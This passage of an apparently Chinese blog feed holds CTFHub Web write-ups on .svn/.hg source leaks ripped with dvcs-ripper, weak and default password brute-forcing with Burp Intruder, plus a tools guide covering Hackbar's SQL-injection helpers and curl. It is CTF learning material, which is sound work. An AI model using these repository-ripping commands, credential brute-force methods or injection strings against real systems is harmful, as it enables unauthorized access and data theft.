Access，简称RA）的多条通道进行访问的。这些通道中，可以通过不同的网络协议，例如HTTP、SSH等，或本地文件的方式来对仓库进行操作。</p><p>相比而下，经典的git开发过程:</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021915480.png"></p><p><strong>2、svn与git</strong></p><p>由上两图，我们推广出SVN和Git的区别：</p><p>1）SVN属于集中化的版本控制系统，有个不太精确的比喻:SVN &#x3D; 版本控制+ 备份服务器</p><p>SVN使用起来有点像是档案仓库的感觉，支持并行读写文件，支持代码的版本化管理，功能包括取出、导入、更新、分支、改名、还原、合并等。</p><p>Git是一个分布式版本控制系统，操作命令包括：clone，pull，push，branch ，merge ，push，rebase，Git擅长的是程序代码的版本化管理。</p><p>2）GIT跟SVN一样有自己的集中式版本库或服务器。但，GIT更倾向于被使用于分布式模式，也就是每个开发人员从中心版本库&#x2F;服务器上chect out代码后会在自己的机器上克隆一个自己的版本库。可以这样说，如果你被困在一个不能连接网络的地方时，就像在飞机上，地下室，电梯里等，你仍然能够提交文件，查看历史版本记录，创建项目分支，等。对一些人来说，这好像没多大用处，但当你突然遇到没有网络的环境时，这个将解决你的大麻烦。</p><p>3）GIT把内容按元数据方式存储，而SVN是按文件</p><p>所有的资源控制系统都是把文件的元信息隐藏在一个类似.svn,.cvs等的文件夹里。如果你把.git目录的体积大小跟.svn比较，你会发现它们差距很大。因为,.git目录是处于你的机器上的一个克隆版的版本库，它拥有中心版本库上所有的东西，例如标签，分支，版本记录等。</p><p>4）分支在SVN中一点不特别，就是版本库中的另外的一个目录。如果你想知道是否合并了一个分支，你需要手工运行像这样的命令svn propget svn:mergeinfo，来确认代码是否被合并。然而，处理GIT的分支却是相当的简单和有趣。你可以从同一个工作目录下快速的在几个分支间切换。你很容易发现未被合并的分支，你能简单而快捷的合并这些文件。</p><p>5）GIT没有一个全局的版本号，而SVN有</p><p>目前为止这是跟SVN相比GIT缺少的最大的一个特征。你也知道，SVN的版本号实际是任何一个相应时间的源代码快照。我认为它是从CVS进化到SVN的最大的一个突破。因为GIT和SVN从概念上就不同，我不知道GIT里是什么特征与之对应。</p><p>6）GIT的内容完整性要优于SVN：</p><p>GIT的内容存储使用的是SHA-1哈希算法。这能确保代码内容的完整性，确保在遇到磁盘故障和网络问题时降低对版本库的破坏。</p><p><strong>3、dvcs-ripper工具的使用</strong></p><p>1）运行示例（适用于 SVN）：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">.<span class="hljs-regexp">/rip-svn.pl -v -u http:/</span><span class="hljs-regexp">/www.example.com/</span>.svn/<br></code></pre></td></tr></table></figure><p>It will automatically do svn revert -R .</p><p>它会自动执行 svn revert -R .</p><p>2）注意事项</p><p>使用svn checkout后，项目目录下会生成隐藏的.svn文件夹（Linux上用ls命令看不到，要用ls -al命令）。</p><p>svn1.6及以前版本会在项目的每个文件夹下都生成一个.svn文件夹，里面包含了所有文件的备份，文件名为 .svn&#x2F;text-base&#x2F;文件名.svn-base</p><p>svn1.7及以后版本则只在项目根目录生成一个.svn文件夹，里面的pristine文件夹里包含了整个项目的所有文件备份</p><p>具体内容请点此链接：<a href="https://blog.csdn.net/2302_81178149/article/details/142714714" title="Web安全常用工具 （持续更新）-CSDN博客">Web安全常用工具 （持续更新）-CSDN博客</a></p><p><strong>4、Linux常用的文件查看命令：</strong></p><p>1）cat ：由第一行开始显示文件内容；</p><p>2）tac：从最后一行开始显示，可以看出tac与cat字母顺序相反；</p><p>3）nl：显示的时候输出行号；</p><p>4）more：一页一页的显示文件内容；</p><p>5）less与more类似，但它可以向前翻页；</p><p>6）head：只看前几行；</p><p>7）tail：只看最后几行；</p><p>8）od：以二进制的方式读取文件；</p><p>9）vi&#x2F;vim：文本编辑器，也可以打开文件查看内容，这个是使用最为广泛的工具</p><h2 id="HG泄露"><a href="#HG泄露" class="headerlink" title="HG泄露"></a>HG泄露</h2><p>一、wp</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021915623.png"></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021915682.png"></p><p>这里提示我们用HG，还是使用<strong>dvcs-ripper</strong>，这次使用<strong>rip-hg.pl</strong>脚本进行 clone。（这里出了一个小错误，使用工具时并不是官方文档中说的rip-hg.pl，而是.&#x2F;rip-hg.pl）</p><p>发现直接执行 hg status 出错，工具 clone 的时候并没有 clone 完整。<strong>不要过分迷信工具。</strong></p><p>使用tree命令列出刚刚下载的.hg网站目录</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021915644.png"></p><p>看到一个.txt，打开看看，发现历史版本add flag，感觉没啥用</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021915789.png"></p><p>利用正则匹配找一下flag（使用正则表达式进行关键字查找，具体方法见下图），也可以在这个文件夹下一个一个找，但这样低效；还可以和上一题一样直接在文件夹里找，但也太麻烦；</p><p>结合题目提示，不太好使的情况下, 试着手工解决，在浏览器里输入这个flag文件（这里就直接用curl了）；</p><p>出flag</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021915997.png"></p><p>上图太小了，又重新截了一张，下图是上图的放大版</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021915363.png"></p><p>二、题目考点</p><p>.hg 文件结构</p><p>Mercurial 的使用</p><p>三、相关知识</p><p>1、HG泄露漏洞</p><p>            Mercurial 是一种轻量级分布式版本控制系统，采用 Python 语言实现，易于学习和使用，扩展性强。其是基于 GNU General Public License (GPL) 授权的开源项目。</p><p>        在 Mercurial 轻量级分布式版本控制系统中，本地既可以当做版本库的服务端，也可以当做版本库的客户端。版本库与工作目录不同，版本库存放了所有版本，而工作目录只是因为特定需要存放特定版本。与 SVN 系统不同，SVN 的版本库集中在一台服务器中。这也导致很多初次使用 Mercurial 系统的工作者，因为操作失误导致出现 HG 泄露漏洞的主要原因。</p><p>2、dvcs-ripper的使用</p><p>具体内容请看作者的另一篇文章：<a href="https://blog.csdn.net/2302_81178149/article/details/142714714" title="Web安全常用工具 （持续更新）-CSDN博客">Web安全常用工具 （持续更新）-CSDN博客</a></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTFHub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>密码口令-CTFHub</title>
    <link href="/2025/05/04/%E5%AF%86%E7%A0%81%E5%8F%A3%E4%BB%A4-CTFHub/"/>
    <url>/2025/05/04/%E5%AF%86%E7%A0%81%E5%8F%A3%E4%BB%A4-CTFHub/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>本文是作者由CSDN博客迁移而来，原文地址：<a href="https://blog.csdn.net/2302_81178149/article/details/142725955">https://blog.csdn.net/2302_81178149/article/details/142725955</a></p></blockquote><p>在众多的CTF平台当中，CTFHub对于初学者来说，是入门平台的不二之选。CTFHub通过自己独特的技能树模块，可以帮助初学者来快速入门。具体请看官方介绍：<a href="https://www.ctfhub.com/#/index" title="CTFHub">CTFHub</a>。</p><p> <strong>作者的CTFHub技能树汇总：</strong></p><p><a href="https://blog.csdn.net/2302_81178149/article/details/142747270?spm=1001.2014.3001.5501" title="CTFHub技能树Web汇总-CSDN博客">CTFHub技能树Web汇总-CSDN博客</a></p><h2 id="弱口令-CTFHub"><a href="#弱口令-CTFHub" class="headerlink" title="弱口令 CTFHub"></a>弱口令 CTFHub</h2><h3 id="一、wp"><a href="#一、wp" class="headerlink" title="一、wp"></a>一、wp</h3><p><strong><em>弱口令</em></strong>：通常认为容易被别人（他们有可能对你很了解）猜测到或被破解工具破解的口令均为弱口令。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505012331042.png">  </p><p>打开环境，是一个管理后台，有趣的是，这题模拟的是CTFHUB wp的管理后台，好好好，看我操作。</p><p>先随机输入11和11</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021901842.png"></p><p>抓包，很明显，需要使用bp爆破name和password，从而破解弱口令</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021901795.png"></p><p>发到intruder，设置Cluster bomb（集束炸弹）方式。</p><p>payload1载入一个常用用户名字典（这个字典下文会提供）</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021858893.png"></p><p>payload2载入一个常用密码字典，下文也会提供</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021901502.png"></p><p>进行攻击，奇怪的是，所有的响应都是200ok，难道都对？不可能。仔细查看，对比数据长度，在length处发现破绽（数据长度不同，其中内容绝对不同，而且总有一个正确的……）</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021901906.png"></p><h3 id="二、目的"><a href="#二、目的" class="headerlink" title="二、目的"></a>二、目的</h3><ul><li>什么是弱口令</li><li>常见弱口令</li><li>Burpsuite-Intruder模块的使用</li></ul><h3 id="三、相关知识"><a href="#三、相关知识" class="headerlink" title="三、相关知识"></a>三、相关知识</h3><p><strong>1、Burp Suite Intruder的4种攻击类型</strong></p><p> <strong>Sniper（狙击手模式）</strong></p><p>使用一组字典，如果你设置了$用户名$、$密码$、$验证码$，那么狙击手模式只会先狙击用户名，狙击完成后才会逐一狙击密码和验证码。</p><p>狙击手模式使用一组payload集合，它一次只使用一个payload位置，假设你标记了两个位置“A”和“B”，payload值为“ctfhub”和“admin”，那么它攻击会形成以下组合（除原始数据外）：</p><table><thead><tr><th>Order</th><th>payload$用户名$</th><th>payload$密码$</th></tr></thead><tbody><tr><td>1</td><td>admin</td><td>空（no place）</td></tr><tr><td>2</td><td>ctfhub</td><td>空（no place）</td></tr><tr><td>3</td><td>空（no place）</td><td>admin</td></tr><tr><td>4</td><td>空（no place）</td><td>ctfhub</td></tr></tbody></table><p><strong>Battering ram（攻城锤模式）</strong></p><p>攻城锤模式与狙击手模式类似的地方是，同样只使用一组字典。</p><p>如果你设置了$用户名$、$密码$、$验证码$，那么攻城锤模式会一次性全部替换执行攻击。</p><p>如下表，</p><table><thead><tr><th>Order</th><th>payload$用户名$</th><th>payload$密码$</th><th>payload$验证码$</th></tr></thead><tbody><tr><td>1</td><td>admin</td><td>admin</td><td>admin</td></tr><tr><td>2</td><td>ctfhub</td><td>ctfhub</td><td>ctfhub</td></tr><tr><td>3</td><td>user</td><td>user</td><td>user</td></tr></tbody></table><p>允许使用多组字典，如果你设置了$用户名$、$密码$、$验证码$，那么草叉模式会在这些地方<strong>遍历所有字典</strong>。</p><p>假设有两个位置“A”和“B”，payload组合1的值为“admin”和“ctfhub”，payload组合2的值为“password”和“123456”，则攻击模式如下：</p><table><thead><tr><th>Order</th><th>payload$用户名$</th><th>payload$密码$</th></tr></thead><tbody><tr><td>1</td><td>admin</td><td>password</td></tr><tr><td>2</td><td>ctfhub</td><td>123456</td></tr></tbody></table><p><strong>Cluster bomb（集束炸弹模式）</strong></p><p>允许使用多组字典，如果你设置了$用户名$、$密码$、$验证码$，那么集束炸弹模式会进行笛卡尔积。<strong>字典一一对应，所有情况都会尝试一遍</strong>。</p><p>还是上面草叉模式的例子，如果用集束炸弹模式进行攻击，则除baseline请求外，会有四次请求：</p><table><thead><tr><th>Order</th><th>payload$用户名$</th><th>payload$密码$</th></tr></thead><tbody><tr><td>1</td><td>admin</td><td>password</td></tr><tr><td>2</td><td>admin</td><td>123456</td></tr><tr><td>3</td><td>ctfhub</td><td>password</td></tr><tr><td>4</td><td>ctfhub</td><td>123456</td></tr></tbody></table><p><strong>2、常用密码本</strong></p><p>这里作者分享搜集的一个专门用来口令爆破的密码本，里面包含常用口令和下文会用到的常见机构默认口令，常用口令里面有许多.txt文件，可以根据不同的情况去进行选择，尽量用最贴近情境的，<strong>当然，这些密码未必有效</strong>。<strong>在进行弱口令爆破时，不仅仅要尝试常用口令，更要针对“客户”进行私人定制“</strong>，比如这题应该在上面口令里加上：ctfhub、CTFHub等等</p><p>要记住弱口令的定义：通常认为<strong>容易被别人（他们有可能对你很了解）猜测到</strong>或被破解工具破解的口令均为弱口令。</p><p>通过百度网盘分享的文件：密码本.zip  </p><p>链接：<a href="https://pan.baidu.com/s/1WTwC0JXyB9hHEEWcQy3Wxw?pwd=jigb" title="百度网盘">百度网盘</a>  </p><p>提取码：jigb</p><h2 id="默认口令"><a href="#默认口令" class="headerlink" title="默认口令"></a>默认口令</h2><h3 id="一、wp-1"><a href="#一、wp-1" class="headerlink" title="一、wp"></a>一、wp</h3><p>检查网页显示内容发现是登录网关，因为此题存在验证码，不便于使用bp爆破</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505012332236.png"></p><p>题目提示默认口令说明此题的账户密码是网关默认密码，浏览器搜索亿邮邮件网关，在亿邮邮件网关使用手册中找到用户名、初始密码，发现有四个</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021901704.png"></p><p>逐个尝试进行登录，成功获取flag。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505012332338.png"></p><h3 id="二、题目考点"><a href="#二、题目考点" class="headerlink" title="二、题目考点"></a>二、题目考点</h3><ul><li>信息搜集</li><li>社会工程</li></ul><h3 id="三、相关知识-1"><a href="#三、相关知识-1" class="headerlink" title="三、相关知识"></a>三、相关知识</h3><p><strong>1、默认口令</strong></p><p>“默认口令”操作通常指的是在系统、软件或设备的初始配置中使用的默认登录凭证（如用户名和密码）进行登录或配置的行为。然而，直接提供或建议使用默认口令（尤其是公开场合）可能会导致安全风险，因为恶意用户可能会利用这些已知的默认凭证来未授权地访问系统。</p><p>用户使用设备时，<strong>会有没来的及或是不愿意去修改默认口令的情况，所以进行爆破时，默认口令是需要优先去尝试的。</strong></p><p><strong>2、常见机构的默认口令</strong></p><p>这里作者给出了常见机构的默认口令，就是上文百度网盘链接里的”密码本.zip“。但密码本里肯定不会包含所有机构的默认口令。</p><p><strong>所以更多时候需要大家先找到设备的隶属机构，然后自己去搜索，在网络资源中找到默认口令，就像本题一样。</strong></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTFHub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Web安全常用工具持续更新</title>
    <link href="/2025/05/04/Web%E5%AE%89%E5%85%A8%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"/>
    <url>/2025/05/04/Web%E5%AE%89%E5%85%A8%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>本文是作者由CSDN博客迁移而来，原文地址：<a href="https://blog.csdn.net/2302_81178149/article/details/142714714?spm=1001.2014.3001.5501">https://blog.csdn.net/2302_81178149/article/details/142714714?spm=1001.2014.3001.5501</a></p></blockquote><p>本文虽然是单独讲web安全相关工具，但在<strong>在安全领域，没有人是先精通工具，再上手做事的</strong>。鉴于web领域繁杂戎多的知识点，如果你在本文的学习过程中遇到没有学过的知识点，可以先跳过去，等你学到这里要用到工具时，再<strong>从实际例子中学习、利用工具</strong>。</p><p>（本文工具的下载基本都可以在<a href="https://www.ctfhub.com/#/tools" title="CTFHub">CTFHub</a>中找到具体链接）</p><h2 id="F12开发者工具"><a href="#F12开发者工具" class="headerlink" title="F12开发者工具"></a><strong>F12开发者工具</strong></h2><h3 id="常规使用"><a href="#常规使用" class="headerlink" title="常规使用"></a><strong>常规使用</strong></h3><p>参考文献：</p><p><a href="https://blog.csdn.net/weixin_44692732/article/details/133217221" title="浏览器F12开发者工具高效使用教程-CSDN博客">浏览器F12开发者工具高效使用教程-CSDN博客</a></p><p><a href="https://blog.csdn.net/weixin_49171365/article/details/132092146" title="小白玩转浏览器开发者工具—F12（超详细）-CSDN博客">小白玩转浏览器开发者工具—F12（超详细）-CSDN博客</a></p><h4 id="0x01-开发者工具是神马？"><a href="#0x01-开发者工具是神马？" class="headerlink" title="0x01 开发者工具是神马？"></a><strong>0x01</strong> <strong>开发者工具是神马？</strong></h4><p>是浏览器自带的一个开发调试工具，因为可以用F12快捷键直接启动，所以简称为F12工具</p><h4 id="0x02-如何启动"><a href="#0x02-如何启动" class="headerlink" title="0x02 如何启动"></a><strong>0x02</strong> <strong>如何启动</strong></h4><p><strong>（三种方法）</strong></p><p>1、F12</p><p>2、ctrl+shift+i</p><p>3、鼠标右键——&gt;检查</p><h4 id="0x03-开发者工具的标签介绍"><a href="#0x03-开发者工具的标签介绍" class="headerlink" title="0x03 开发者工具的标签介绍"></a><strong>0x03</strong> <strong>开发者工具的标签介绍</strong></h4><table><thead><tr><th><strong>英文</strong></th><th><strong>中文</strong></th></tr></thead><tbody><tr><td><strong>Elements</strong></td><td><strong>查看器</strong></td></tr><tr><td><strong>Console</strong></td><td><strong>控制台</strong></td></tr><tr><td><strong>Sourse</strong></td><td><strong>源代码&#x2F;调试器</strong></td></tr><tr><td><strong>Network</strong></td><td><strong>网络</strong></td></tr><tr><td><strong>Performance</strong></td><td><strong>性能</strong></td></tr><tr><td><strong>Memory</strong></td><td><strong>存储</strong></td></tr><tr><td><strong>Application</strong></td><td><strong>应用</strong></td></tr></tbody></table><p>查看器：主要用来做元素的定位  </p><p>控制台：调试错误等  </p><p>源代码&#x2F;调试器：前端代码的调试，断点等  </p><p>网络：测试用来<strong>抓包</strong>、进行分析进行一些测试问题的定位  </p><p>性能：前端页面的性能  </p><p>存储：<strong>存储cookie</strong>缓存等</p><h4 id="0x04-常用标签详细介绍"><a href="#0x04-常用标签详细介绍" class="headerlink" title="0x04 常用标签详细介绍"></a><strong>0x04 常用标签详细介绍</strong></h4><p><strong>一、Elements&#x2F;查看器</strong></p><p><strong>1.查看元素的代码</strong></p><p><strong>点击左上角的箭头图标(或按快捷键Ctrl+Shft+C)进入选择元素模式，</strong></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022007293.png"></p><p><strong>然后从页面中选择需要查看的元素</strong>，然后可以在开发者工具元素(Elements) -栏中定位到该元素源代码的具体位置。</p><p><strong>2.查看元素的属性</strong></p><p>定位到元素的源代码之后，可以从源代码中读出该元素的属性。如class、 src、 width等属性的值。</p><p><strong>3.修改元素的代码与属性</strong></p><p>点击元素，然后查看右键菜单，可以看到chrome提供的可对元素进行的操作:选择Edit as HTML选项时,元素进入编辑模式，可以对元素的代码进行任意的修改。</p><p>当然，<strong>这个修改也仅对当前的页面渲染生效，不会修改服务器的源代码</strong>，所以这个功能也是作为调试页面效果而使用。可以把百度热搜修改一下：</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022007125.png"></p><p>“非凡中国”改为”重庆森林不在重庆“（由于这里仅仅是修改前端，所以只有我们的设备会这样显示）</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022007571.png"></p><p><strong>二、Console&#x2F;控制台</strong></p><p>用途：开发时用来测试  </p><p>打印控制台的查看，用于测试查看报错内容（前端页面报错），前端开发编写js脚本调试前端代码，或则打印分析问题。</p><p>如果大家接触过javascript就会知道，它最开始是一门客户端语言，和PHP、Java等服务端语言不同，并不能像服务端语言那样运行、调试，而是通过运行后在浏览器里调试（就像客户一样在使用中调试）</p><p><strong>三、Network&#x2F;网络</strong></p><p><strong>1、用途</strong></p><p>这是测试用的较多的一个模块,主要用于进行测试问题的分析和定位,这个部分记录了前后端的交互，<strong>我们与服务器请求、响应的各个数据包记录在这里</strong>。</p><p>前端和后端信息通过接口传输，Network记录了接口信息: (接口封装http协议–定义头部)</p><p>http请求消息:请求行(请求方法)、请求头、请求体–客户端发送</p><p>http响应消息:响应行(响应状态码)，响应头，响应体-服务器回应</p><p><strong>2、报文分析</strong></p><p>请参考作者的另一篇文章：<a href="https://blog.csdn.net/2302_81178149/article/details/142706863?spm=1001.2014.3001.5501" title="HTTP原理及具体细节-CSDN博客">HTTP原理及具体细节-CSDN博客</a></p><p>（HTTP是Web安全基础，下面工具有的也要参考这篇文章）</p><p><strong>四、Memory&#x2F;存储</strong></p><p><strong>用途：</strong> <strong>主要存储一些cookies和前端数据等，上面链接的文章里详解了Cookie</strong>。</p><p>本地存储和会话存储主要是前端开发人员在前端设置，一旦数据保存在本地后，就可以避免再向服务器请求数据，因此减少不必要的数据请求，减少数据在浏览器和服务器间不必要地来回传递。</p><p>本地存储和会话存储的操作代码完全相同，它们的区别仅在于数据的寿命。</p><p>本地存储： 保存不受时间限制，用于长期保存网站的数据；除非用户自己删除，否则不会消失；并且站内任何页面都可以访问该数据；主要用来保存访客将来还能看到的数据。</p><p>会话存储： 用于临时保存针对一一个窗口(或标签页)的数据，保存受时间限制，当前窗口一旦关闭，内容就会被浏览器删除。会话存储则用于保存那些需要从一个页面传递给下一个页面的数据。</p><h3 id="Hackbar"><a href="#Hackbar" class="headerlink" title="Hackbar"></a><strong>Hackbar</strong></h3><p>（归属于开发者工具一栏，故放在此处）</p><p>参考文献：</p><p><a href="https://blog.csdn.net/qq_38612882/article/details/122383568" title="渗透测试-浏览器插件-Hackbar的安装与使用教程-CSDN博客">渗透测试-浏览器插件-Hackbar的安装与使用教程-CSDN博客</a></p><h4 id="0x01-介绍"><a href="#0x01-介绍" class="headerlink" title="0x01 介绍"></a><strong>0x01</strong> <strong>介绍</strong></h4><p>Hackbar是一个浏览器中的一个插件，<strong>它虽然类似于地址栏，但在此基础上进行了完善，是一个功能集成的“地址栏promax”</strong>。hackbar相对于平常的地址栏具有更多功能，而且它里面的数据不受服务器的相应触发的重定向等其它变化的影响，并为Web渗透提供辅助。</p><h4 id="0x02-使用"><a href="#0x02-使用" class="headerlink" title="0x02 使用"></a><strong>0x02</strong> <strong>使用</strong></h4><p><strong>Load URL</strong>**：**复制地址栏中的地址（主要使用下图第一个hackbar）</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022007724.png"></p><p>**Split URL：**剪切地址</p><p>正常情况下，我们在地址栏按enter键换行会直接跳转到我们输入的网址，并不能切断地址，而在hackbar中可以在做到这一点</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022007271.png"></p><p>**Execute：**执行HackBar中的网址，并且发送已选择的数据（或是发送GET请求、或是发送POST请求、或是……）</p><p>**Post data：**以post的方式提交数据</p><p>**Referer：**在Referer处编辑、提交数据</p><p>**User Agent：**在User Agent处编辑、提交数据</p><p>**Cookie：**在Cookie处编辑、提交数据</p><p>（下图是将四项全部选择，具体使用过程中用哪个选哪个即可。至于这四项的相关解释，还是看上面链接的文章）</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022007328.png"></p><p>**Encyption：**四种加密方式</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022007347.png"></p><p> **Encoding：**三种编码方式（<strong>注意只有三种，但是每种都可以编、解码，encode是编码，decode是解码</strong>）</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022007436.png"></p><p> **SQL：**提供一些方便查询的语句。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022007857.png"></p><p>应用举例：</p><p>字段数是10的时候，我们需要手动打出<code>and 1=2 union select 1,2,3,4,5,6,7,8,9,10</code>，这样做会很麻烦。我们通过hackbar的sql选项里面的<code>union select statement</code>在其中输入字段数，hackbar会自动的帮助我们输入那一大串文字。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022007142.png"></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022007628.png"></p><p><strong>XSS</strong>：提供一些XSS攻击语句。</p><h2 id="Curl命令"><a href="#Curl命令" class="headerlink" title="Curl命令"></a><strong>Curl命令</strong></h2><p>参考文献：</p><p><a href="https://catonmat.net/cookbooks/curl" title="Curl Cookbook">Curl Cookbook</a>（后两文是阮一峰对这篇文章的翻译）</p><p><a href="http://www.ruanyifeng.com/blog/2011/09/curl.html" title="curl网站开发指南 - 阮一峰的网络日志">curl网站开发指南 - 阮一峰的网络日志</a>(初学者教程)</p><p><a href="http://www.ruanyifeng.com/blog/2019/09/curl-reference.html" title="curl 的用法指南 - 阮一峰的网络日志">curl 的用法指南 - 阮一峰的网络日志</a>(进阶)</p><p><a href="https://blog.csdn.net/qq_35760825/article/details/125319610" title="curl的使用_curl -fssl-CSDN博客">curl的使用_curl -fssl-CSDN博客</a></p><h3 id="0x01-介绍-1"><a href="#0x01-介绍-1" class="headerlink" title="0x01 介绍"></a><strong>0x01</strong> <strong>介绍</strong></h3><p>curl 是常用的命令行工具，用来请求 Web 服务器。它的名字就是客户端（client）的 URL 工具的意思，即client URL。</p><p>它的功能比较强大，命令行参数多达几十种。</p><h3 id="0x02-使用-1"><a href="#0x02-使用-1" class="headerlink" title="0x02 使用"></a><strong>0x02</strong> <strong>使用</strong></h3><p>1、<strong>查看网页源码</strong></p><p>直接在curl命令后加上网址，就可以看到网页源码。我们以网址<a href="http://www.sina.com为例（选择该网址，主要因为它的网页代码较短）：">www.sina.com为例（选择该网址，主要因为它的网页代码较短）：</a></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">curl</span> www.sina.com<br></code></pre></td></tr></table></figure><p>访问结果：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">HTML</span> <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">&quot;-//IETF//DTD HTML 2.0//EN&quot;</span>&gt;</span><br>　　<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>　　<span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>301 Moved Permanently<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>　　<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>　　<span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Moved Permanently<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>　　<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>The document has moved <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;http://www.sina.com.cn/&quot;</span>&gt;</span>here<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>　　<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>　　<br></code></pre></td></tr></table></figure><p>如果要把这个网页保存下来，可以使用`-o`参数，这就相当于使用wget命令了。   </p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">curl -o <span class="hljs-selector-attr">[文件名]</span> www<span class="hljs-selector-class">.sina</span>.com<br></code></pre></td></tr></table></figure><p>2、<strong>自动跳转（curl默认是不跟随重定向的）</strong></p><p>有的网址是自动跳转的。使用`-L`参数，curl就会跳转到新的网址。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">curl</span> -L www.sina.com<br></code></pre></td></tr></table></figure><p>键入上面的命令，结果就自动跳转为<a href="http://www.sina.com.cn./">www.sina.com.cn。</a></p><p>3、<strong>HTTP动词</strong></p><p>curl默认的HTTP动词是GET，使用`-X`参数可以支持其他动词。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">curl -<span class="hljs-attribute">X</span> POST www<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.com</span><br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">curl -<span class="hljs-attribute">X</span> DELETE www<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.com</span><br></code></pre></td></tr></table></figure><p>另外，使用 -d 参数以后，HTTP 请求会自动加上标头 Content-Type : application&#x2F;x-www-form-urlencoded，并且会自动将请求转为 POST 方法，因此可以省略-X POST。</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">curl -d &#x27;&#123;<span class="hljs-string">&quot;user&quot;</span>:<span class="hljs-string">&quot;123&quot;</span>,<span class="hljs-string">&quot;pass&quot;</span>:<span class="hljs-string">&quot;456&quot;</span>&#125;&#x27; www.<span class="hljs-built_in">example</span>.com<br></code></pre></td></tr></table></figure><p>4、<strong>Cookie</strong></p><p>使用`–cookie`参数，可以让curl发送cookie。</p><figure 